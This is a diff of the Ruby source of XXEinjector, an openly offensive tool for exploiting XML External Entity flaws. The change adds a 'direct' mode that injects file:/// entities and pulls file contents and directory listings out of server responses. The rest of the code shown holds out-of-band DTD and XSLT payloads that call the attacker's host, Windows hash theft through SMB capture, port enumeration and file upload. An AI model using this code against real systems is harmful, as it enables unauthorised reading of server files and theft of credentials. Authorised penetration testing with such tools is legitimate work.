@@ -6,6 +6,7 @@ require 'uri'
 require 'net/http'
 require 'net/https'
 require 'base64'
+require 'readline'
 
 # CONFIGURE
 host = "" # our external ip
@@ -22,6 +23,7 @@ phpfilter = "n" # if yes php filter will be used to base64 encode file content -
 $urlencode = "n" # if injected DTD should be URL encoded
 enumall = "n" # if yes XXEinjector will not ask what to enum (prone to false positives) - y/n
 brute = "" # file with paths to bruteforce
+$direct = "" # if direct exploitation should be used, this parameter should contain unique mark between which results are returned
 
 hashes = "n" # steal Windows hashes
 upload = "" # upload this file into temp directory using Java jar schema
@@ -64,6 +66,7 @@ ARGV.each do |arg|
 	$urlencode = "y" if arg.include?("--urlencode")
 	$dtdi = "n" if arg.include?("--nodtd")
 	$xslt = "y" if arg.include?("--xslt")
+	$direct = arg.split("=")[1] if arg.include?("--direct=")
 end
 
 # show DTD to inject
@@ -75,16 +78,24 @@ if ARGV.include? "--dtd"
 		http_port = "HTTPPORT"
 	end
 	puts ""
-	puts "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
+	puts "<!DOCTYPE m [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
+	puts ""
+	exit(1)
+end
+
+# show sample direct exploitation XML
+if ARGV.include? "--xml"
+	puts ""
+	puts "<!DOCTYPE m [ <!ENTITY direct SYSTEM \"XXEINJECT\">]><tag>UNIQUEMARK&direct;UNIQUEMARK</tag>"
 	puts ""
 	exit(1)
 end
 
 # show main menu
-if ARGV.nil? || ARGV.size < 3 || host == "" || $file == "" || (path == "" && brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n")
+if ARGV.nil? || ARGV.size < 3 || (host == "" && $direct == "") || $file == "" || (path == "" && brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n")
 	puts "XXEinjector by Jakub Pa\u0142aczy\u0144ski"
 	puts ""
-	puts "XXEinjector automates retrieving files using out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications."
+	puts "XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications."
 	puts ""
 	puts "Options:"
 	puts "  --host	Mandatory - our IP address for reverse connections. (--host=192.168.0.2)"
@@ -93,6 +104,7 @@ if ARGV.nil? || ARGV.size < 3 || host == "" || $file == "" || (path == "" && bru
 	puts "  --brute	Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)"
 	puts ""
 	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
+	puts "  --direct		Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)"
 	puts "  --phpfilter		Use PHP filter to base64 encode target file before sending."
 	puts "  --enumports		Enumerating unfiltered ports for reverse connection. Specify value \"all\" to enumerate all TCP ports. (--enumports=21,22,80,443,445)"
 	puts ""
@@ -122,6 +134,8 @@ if ARGV.nil? || ARGV.size < 3 || host == "" || $file == "" || (path == "" && bru
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher"
 	puts "  Bruteforcing files using HTTP out of band method:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http"
+	puts "  Enumerating using direct exploitation:"
+	puts "  ruby #{__FILE__} --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK"
 	puts "  Enumerating unfiltered ports:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --enumports=all"
 	puts "  Stealing Windows hashes:"
@@ -145,6 +159,8 @@ end
 $dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
 # XSL to inject
 $xsl = "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:variable name=\"cmd\" select=\"document('http://#{host}:#{xslt_port}/success')\"/><xsl:value-of select=\"$cmd\"/></xsl:template></xsl:stylesheet>"
+# holds HTTP responses
+$response = ""
 # regex to find directory listings
 regex = /^[$.\-_~ 0-9A-Za-z]+$/
 # array that holds filenames to enumerate
@@ -152,6 +168,7 @@ filenames = Array.new
 # temp path holders - hold next filenames in different format being enumerated
 nextpath = ""
 enumpath = ""
+$directpath = ""
 # array that contains skipped paths
 blacklist = Array.new
 # other variables
@@ -161,6 +178,10 @@ $method = "post" # HTTP method - get/post
 cmp = "" # holds user input
 switch = 0 # this switch locks enumeration if response is pending
 i = 0 # main counter
+$time = 1 # HTTP response timeout
+if $direct != ""
+	$time = 30
+end
 
 # Remove first slash if unix-like path specified
 cut = 0
@@ -198,7 +219,9 @@ def configreq()
 	if $dtdi == "y"
 		turi = URI.decode($uri).gsub("+", " ")
 		if turi.include?("XXEINJECT")
-			if $xslt == "n"
+			if $direct != ""
+				$uri = $uri.sub("XXEINJECT", "file:///#{$directpath}")
+			elsif $xslt == "n"
 				$uri = $uri.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
 			else
 				$uri = $uri.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
@@ -259,7 +282,9 @@ def configreq()
 			header = File.readlines($file)[i].chomp
 			if $dtdi == "y"
 				if header.include?("XXEINJECT")
-					if $urlencode == "y"
+					if $direct != ""
+						header = header.sub("XXEINJECT", "file:///#{$directpath}")
+					elsif $urlencode == "y"
 						if $xslt == "n"
 							header = header.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+").gsub(";", "%3B"))
 						else
@@ -276,7 +301,10 @@ def configreq()
 					found = found + 1
 				end
 			end
-			$headers[header.split(": ")[0]] = header.split(": ")[1]
+			if header.include?("Accept-Encoding") && $direct != ""
+			else
+				$headers[header.split(": ")[0]] = header.split(": ")[1]
+			end
 		end
 		i = i + 1
 	end
@@ -292,7 +320,9 @@ def configreq()
 			if $dtdi == "y"
 				tline = URI.decode(postline).gsub("+", " ")
 				if tline.include?("XXEINJECT") && $xslt == "n"
-					if $urlencode == "y"
+					if $direct != ""
+						postline = postline.sub("XXEINJECT", "file:///#{$directpath}")
+					elsif $urlencode == "y"
 						if $xslt == "n"
 							postline = postline.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
 						else
@@ -342,6 +372,8 @@ def configreq()
 					$post = $post.sub(/(%3c%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 					$post = $post.sub(/(%3c\?xml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 					$post = $post.sub(/(\<%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				else
+					$post = $post.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 				end
 				puts "DTD injected." if $verbose == "y"
 				found = found + 1
@@ -356,6 +388,8 @@ def configreq()
 					$post = $post.sub(/(%3c%3fxml)(.*)/im, $xsl)
 					$post = $post.sub(/(%3c\?xml)(.*)/im, $xsl)
 					$post = $post.sub(/(\<%3fxml)(.*)/im, $xsl)
+				else
+					$post = $post.sub("XXEINJECT", $xsl.gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 				end
 				puts "DTD injected." if $verbose == "y"
 				found = found + 1
@@ -416,13 +450,14 @@ def sendreq()
 		puts "Sending request with malicious XML."
 	end
 	
+	$response = ""
 	$request.start { |r|
 		begin
-			status = Timeout::timeout(1) {
+			status = Timeout::timeout($time) {
     				if $method == "post"
-					r.post($uri, $post, $headers) 
+					$response = r.post($uri, $post, $headers) 
 				else
-					r.get($uri, $headers)
+					$response = r.get($uri, $headers)
 				end
   			}
 		rescue Timeout::Error
@@ -432,13 +467,13 @@ end
 
 # Starting servers
 begin
-	if $xslt == "n" && enumports == ""
+	if $xslt == "n" && enumports == "" && $direct == ""
 		http = TCPServer.new http_port
 	end
-	if enum == "ftp" && $xslt == "n" && enumports == ""
+	if enum == "ftp" && $xslt == "n" && enumports == "" && $direct == ""
 		ftp = TCPServer.new ftp_port
 	end
-	if enum == "gopher" && $xslt == "n" && enumports == ""
+	if enum == "gopher" && $xslt == "n" && enumports == "" && $direct == ""
 		gopher = TCPServer.new gopher_port
 	end
 	if upload != ""
@@ -476,7 +511,7 @@ loop do
 					puts "Responding with XML for: #{enumpath}"
 				end
 			else
-				puts "Responding with XML for."
+				puts "Responding with proper XML."
 			end
 
 			# respond with proper XML
@@ -884,7 +919,9 @@ if enumports != ""
 	end
 	exit(1)
 else
-	configreq()
+	if $direct == ""
+		configreq()
+	end
 end
 
 # TCP server for uploading files using Java jar
@@ -927,31 +964,82 @@ end
 # Retriving Windows hashes
 if hashes == "y"
 	puts "Start msfconsole with auxiliary/server/capture/smb. Press enter when started."
-	$stdin.gets
+	Readline.readline("> ", true)
 	sendreq()
 	sleep(10)
 	puts "Check msfconsole for hashes."
-	$stdin.gets
+	Readline.readline("> ", true)
 	exit(1)
 end
 
 # Sending first request
 if brute == ""
-	enumpath = path
-	switch = 1
-	puts "Enumeration locked." if $verbose == "y"
-	sendreq()
-
-	# Loop that checks if response with next file content was received by FTP/HTTP servers
-	loop do
-		sleep timeout
-		if switch == 1 && hashes == "n" && upload == ""
-			puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
-			cmp = $stdin.gets.chomp
-			break if cmp == "n" || cmp == "N"
-			sleep timeout
+	if $direct == ""
+		enumpath = path
+		switch = 1
+		puts "Enumeration locked." if $verbose == "y"
+		sendreq()
+	else
+		done = 0
+		$directpath = path
+		configreq()
+		sendreq()
+		if !$response.body.include?("#{$direct}")
+			puts "Response does not contain unique mark."
+			exit(1)
 		else
-			break
+			if $response.body.include?("#{$direct}#{$direct}")
+				puts "File/directory could not be retrieved."
+				exit(1)
+			else
+				$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
+					
+					# log to separate file or brute.log if in bruteforce mode
+					logpath = "#{path}"
+					logpath = logpath.gsub('\\','/')
+					if logpath.include?("/")
+						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
+					else
+						FileUtils.mkdir_p $remote + "/" + logpath
+					end
+					if  done == 0
+						if cut == 1
+							puts "Successfully logged file: /#{logpath}"
+							done = 1
+						else
+							puts "Successfully logged file: #{logpath}"
+							done = 1
+						end
+					end
+					log = File.open($remote + "/" + "#{logpath}.log", "a")
+					log.write param + "\n"
+					log.close
+					
+					# push to array if directory listing is detected for further enumeration
+					param = param.chomp
+					if param.match regex
+						filenames.push(param)
+						puts "Path pushed to array: #{param}" if $verbose == "y"
+					end
+
+				end
+			end
+		end
+	end
+
+		# Loop that checks if response with next file content was received by FTP/HTTP servers
+	if $direct == ""
+		loop do
+			sleep timeout
+			if switch == 1 && hashes == "n" && upload == ""
+				puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
+				cmp = Readline.readline("> ", true)
+				Readline::HISTORY.push
+				break if cmp == "n" || cmp == "N"
+				sleep timeout
+			else
+				break
+			end
 		end
 	end
 end
@@ -982,7 +1070,8 @@ loop do
 						puts "Enumerate /#{path}/#{line} ? Y[yes]/n[no]/s[skip all files in this directory]"
 					end
 				end
-				cmp = $stdin.gets.chomp
+				cmp = Readline.readline("> ", true)
+				Readline::HISTORY.push
 				if cmp == "s" || cmp == "S"
 					if cut == 0
 						blacklist.push("#{path}\\#{line}".split("\\")[0..-2].join('\\'))
@@ -1005,55 +1094,138 @@ loop do
 	
 				# Send request with next filename
 				if cut == 1
-					enumpath = "#{path}/#{line}"
+					if $direct != ""
+						$directpath = "#{path}/#{line}"
+						configreq()
+					else
+						enumpath = "#{path}/#{line}"
+					end
 					sendreq()
 				else
-					enumpath = "#{path}\\#{line}"
+					if $direct != ""
+						$directpath = "#{path}\\#{line}"
+						configreq()
+					else
+						enumpath = "#{path}\\#{line}"
+					end
 					sendreq()
 				end
 
 				# Loop that checks if response with next file content was received by FTP/HTTP servers
-				loop do
-					sleep timeout
-					if switch == 1
-						puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
-						cmp = $stdin.gets.chomp
-						break if cmp == "n" || cmp == "N"
+				if $direct == ""
+					loop do
 						sleep timeout
+						if switch == 1
+							puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
+							cmp = Readline.readline("> ", true)
+							Readline::HISTORY.push
+							break if cmp == "n" || cmp == "N"
+							sleep timeout
+						else
+							break
+						end
+					end
+				else
+					if not $response.body.include?("#{$direct}")
+						puts "Response does not contain unique mark."
 					else
-						break
+						if $response.body.include?("#{$direct}#{$direct}")
+							puts "File/directory could not be retrieved."
+						else
+							done = 0
+							$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
+
+								# log to separate file or brute.log if in bruteforce mode
+								logpath = "#{path}"
+								logpath = logpath.gsub('\\','/')
+								if logpath.include?("/")
+									FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
+								else
+									FileUtils.mkdir_p $remote + "/" + logpath
+								end
+								if  done == 0
+									if cut == 1
+										puts "Successfully logged file: /#{logpath}"
+										done = 1
+									else
+										puts "Successfully logged file: #{logpath}"
+										done = 1
+									end
+								end
+								log = File.open($remote + "/" + "#{logpath}.log", "a")
+								log.write param + "\n"
+								log.close
+					
+								# push to array if directory listing is detected for further enumeration
+								param = param.chomp
+								if param.match regex
+									filenames.push(param)
+									puts "Path pushed to array: #{param}" if $verbose == "y"
+								end
+
+							end
+						end
 					end
 				end
 
 			end
 			i = i + 1
+		else
+			puts "Nothing else to do. Exiting."
+			exit(1)
 		end
 	else
 		brutefile = File.open(brute, "r")
-		if !IO.readlines(brutefile)[i].nil?
+		exit(1) if IO.readlines(brutefile)[i].nil?
 		
-			# Read next line
-			line = IO.readlines(brutefile)[i]
-			line = line.chomp
+		# Read next line
+		line = IO.readlines(brutefile)[i]
+		line = line.chomp
 
-			log = File.open( "brute.log", "a")
-			log.write "\n"
-			log.write "Filename: #{line}\n"
-			log.close
+		log = File.open( "brute.log", "a")
+		log.write "\n"
+		log.write "Filename: #{line}\n"
+		log.close
 
-			if line[0] == "/"
-				line[0] = ''
-			end
-
-			line = line.gsub(' ','%20')
-
-			# Send request with next filename
-			enumpath = "#{line}"
-			sendreq()
-
-			i = i + 1
-
+		# handle unix and windows paths
+		if line[0] == "/"
+			line[0] = ''
+			cut = 1
 		end
+		if line[-1] == "/"
+			line[-1] = ''
+		end
+		if line[-2..-1] == "\\\\"
+			line[-2..-1] = ''
+		end
+		if line[-1] == "\\"
+			line[-1] = ''
+		end
+
+		line = line.gsub(' ','%20')
+
+		# Send request with next filename
+		if $direct == ""
+			enumpath = "#{line}"
+		else
+			$directpath = "#{line}"
+			configreq()
+		end
+		sendreq()
+
+		if $direct != ""
+			if not $response.body.include?("#{$direct}")
+				puts "Response does not contain unique mark." if $verbose == "y"
+			else
+				log = File.open("brute.log", "a")
+				log.write $response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n") + "\n"
+				puts "Bruteforced request logged: #{$directpath}" if $verbose == "y"
+				log.close
+			end
+		end
+
+		i = i + 1
+		
 		brutefile.close
 		sleep timeout
 	end
